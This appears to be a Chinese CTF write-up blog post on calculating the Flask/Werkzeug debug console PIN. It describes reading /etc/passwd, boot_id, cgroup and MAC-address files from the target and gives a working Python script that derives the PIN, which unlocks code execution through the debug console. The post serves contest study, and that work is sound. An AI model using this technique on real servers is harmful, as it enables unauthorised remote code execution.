---
title: "flask PIN码的计算"
date: 2025-06-03 22:41:00
categories:
  - "Security Notes"
tags:
  - "Security"
  - "Web"
cnblogs_postid: "18909263"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18909263"
---

### 谁家科创项目拉这了？
[\[ctfshow web入门\]常用姿势801-806\_ctfshow web入门801-CSDN博客](https://blog.csdn.net/weixin_45751765/article/details/124099832)
信息搜集
查看用户/etc/passwd
![../../比赛wp/assets/2025CPPU第二届网络攻防校赛/屏幕截图 2025-05-05 165259.png](/assets/cnblogs/flask PIN码的计算/3539156-20250603224057672-1411591263.png)
查看逻辑找到flask源代码
![../../比赛wp/assets/2025CPPU第二届网络攻防校赛/屏幕截图 2025-05-05 164503.png](/assets/cnblogs/flask PIN码的计算/3539156-20250603224057602-965766687.png)
查看bootid /proc/sys/kernel/random/boot_id
![../../比赛wp/assets/2025CPPU第二届网络攻防校赛/屏幕截图 2025-05-05 164527.png](/assets/cnblogs/flask PIN码的计算/3539156-20250603224057616-413058744.png)
查看另一串用户码/proc/self/cgroup
![../../比赛wp/assets/2025CPPU第二届网络攻防校赛/屏幕截图 2025-05-05 164801.png](/assets/cnblogs/flask PIN码的计算/3539156-20250603224057582-550121233.png)
查看mac地址/sys/class/net/eth0/address
![../../比赛wp/assets/2025CPPU第二届网络攻防校赛/屏幕截图 2025-05-05 165039.png](/assets/cnblogs/flask PIN码的计算/3539156-20250603224057649-1675110785.png)
```Python
import hashlib  
import getpass  
from flask import Flask  
from itertools import chain  
import sys  
import uuid  
import typing as t  
username='root'  
app = Flask(__name__)  
modname=getattr(app, "__module__", t.cast(object, app).__class__.__module__)  
mod=sys.modules.get(modname)  
mod = getattr(mod, "__file__", None)  
  
probably_public_bits = [  
    username, #用户名  
    modname,  #一般固定为flask.app  
    getattr(app, "__name__", app.__class__.__name__), #固定，一般为Flask  
    '/usr/local/lib/python3.8/site-packages/flask/app.py',   #主程序（app.py）运行的绝对路径  
]  
print(probably_public_bits)  
mac ='02:42:ac:11:00:04'.replace(':','')  
mac=str(int(mac,base=16))  
private_bits = [  
   mac,#mac地址十进制  
 "2be631bd-5d4a-4e05-bb0d-3dd390c186e454e2c173887ea2af93ddc91819f0b9766b42d184272006ac6605d85de075ee47"  
     ]  
print(private_bits)  
h = hashlib.sha1()  
for bit in chain(probably_public_bits, private_bits):  
    if not bit:  
        continue  
    if isinstance(bit, str):  
        bit = bit.encode("utf-8")  
    h.update(bit)  
h.update(b"cookiesalt")  
  
cookie_name = f"__wzd{h.hexdigest()[:20]}"  
  
# If we need to generate a pin we salt it a bit more so that we don't  
# end up with the same value and generate out 9 digits  
h.update(b"pinsalt")  
num = f"{int(h.hexdigest(), 16):09d}"[:9]  
  
# Format the pincode in groups of digits for easier remembering if  
# we don't have a result yet.  
rv=None  
if rv is None:  
    for group_size in 5, 4, 3:  
        if len(num) % group_size == 0:  
            rv = "-".join(  
                num[x : x + group_size].rjust(group_size, "0")  
                for x in range(0, len(num), group_size)  
            )  
            break  
    else:  
        rv = num  
  
print(rv)
```
![../../比赛wp/assets/2025CPPU第二届网络攻防校赛/file-20250505194013293.png](/assets/cnblogs/flask PIN码的计算/3539156-20250603224057592-525843401.png)
